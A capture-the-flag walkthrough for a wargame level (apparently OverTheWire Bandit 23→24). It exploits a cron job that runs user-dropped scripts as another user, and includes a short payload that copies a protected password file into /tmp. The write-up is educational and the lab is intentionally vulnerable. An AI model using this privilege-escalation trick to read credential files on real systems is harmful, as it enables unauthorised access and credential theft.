# Level 23 → Level 24

---

## Steps Taken

### 1. Understanding the Task

A program is running automatically from cron. We must inspect `/etc/cron.d` to see what command is executed, follow that to the wrapper script, and supply a shell script the wrapper will run so we can obtain the next level’s password. The wrapper executes scripts found in `/var/spool/<user>/foo` that are owned by `bandit23`, then deletes them.

---

### 2. Checking `/etc/cron.d` for the cron job

Commands run:

```bash
cd /etc/cron.d
ls
cat cronjob_bandit24
```

Observed contents:

```text
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

`* * * * *` means the wrapper runs every minute as `bandit24`.

---

### 3. Reading the wrapper script (`/usr/bin/cronjob_bandit24.sh`)

Command run:

```bash
cat /usr/bin/cronjob_bandit24.sh
```

Wrapper contents:

```bash
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

This shows the wrapper will `cd` into `/var/spool/bandit24/foo`, execute files owned by `bandit23`, then remove them.

---

### 4. Creating the payload script and retrieving the password

Commands run (user actions):

```bash
mktemp -d
cd /tmp/tmp.IOXdFsu199
nano getpassword.sh      # (nano shows local-history warning but allows saving)
chmod +x getpassword.sh  # make the script executable so the wrapper can run it
ls -la
chmod +w .               # add write permission to the current directory (for testing)
chmod 777 .              # set full perms on the temp dir (used here to avoid permission blockers)
cp getpassword.sh /var/spool/bandit24/foo
```

Payload content placed into `getpassword.sh` via `nano`:

```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/plspassword.txt
```

Then the wrapper executed the script (it runs every minute and deletes executed scripts). After waiting for a minute:

```bash
cat /tmp/plspassword.txt
```

From this, I was able to determine the password for the next level.
